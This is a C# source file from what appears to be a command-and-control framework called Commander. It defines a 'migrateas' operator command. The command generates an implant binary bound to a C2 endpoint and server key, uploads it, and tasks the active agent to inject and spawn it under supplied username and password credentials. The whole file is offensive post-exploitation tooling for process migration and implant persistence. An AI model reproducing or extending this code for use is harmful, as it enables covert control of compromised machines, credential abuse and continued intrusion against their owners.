using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Commander.Models;
using Commander.Commands.Agent;
using Common;
using Common.Payload;

namespace Commander.Commands.Laucher
{
    public class MigrateASCommandOptions
    {
        public string username { get; set; }
        public string password { get; set; }
        public string endpoint { get; set; }
        public bool debug { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }

        public string serverKey { get; set; }
    }
    public class MigrateASCommand : EnhancedCommand<MigrateASCommandOptions>
    {
        public override string Category => CommandCategory.Commander;
        public override string Description => "Migrate the current agent to another process ";
        public override string Name => "migrateas";

        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("username"),
            new Argument<string>("password"),
            new Option<string>(new[] { "--endpoint", "-b" }, () => null, "EndPoint to Bind To"),
            new Option<string>(new[] { "--serverKey", "-k" }, () => null, "The server unique key of the endpoint"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<MigrateASCommandOptions> context)
        {
            var agent = context.Executor.CurrentAgent;
            if (string.IsNullOrEmpty(context.Options.endpoint))
            {
                context.Terminal.WriteLine($"No Endpoint selected, taking the current agent enpoint ({agent.Metadata.EndPoint})");
                context.Options.endpoint = agent.Metadata.EndPoint;
            }

            var endpoint = ConnexionUrl.FromString(context.Options.endpoint);
            if (!endpoint.IsValid)
            {
                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            context.Terminal.WriteLine($"[>] Generating binary...");

            var options = new PayloadGenerationOptions()
            {
                Architecture = context.Options.x86 ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = context.Options.debug,
                IsVerbose = context.Options.verbose,
                ServerKey = string.IsNullOrEmpty(context.Options.serverKey) ? context.Config.ServerConfig.Key : context.Options.serverKey,
                Type = PayloadType.Binary
            };

            var pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);
           
            if (pay == null)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                return false;
            }
            else
                context.Terminal.WriteSuccess($"[+] Generation succeed!");

            context.Terminal.WriteLine($"Preparing to upload the file...");

            var fileName = ShortGuid.NewGuid() + ".bin";

            var fileId = await context.UploadAndDisplay(pay, fileName);

 
            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawnas", fileId, fileName, $"{context.Options.username} {context.Options.password}");

            context.Terminal.WriteInfo($"File uploaded to the server, agent tasked to download the file and migrate.");

            return true;
        }
    }

}
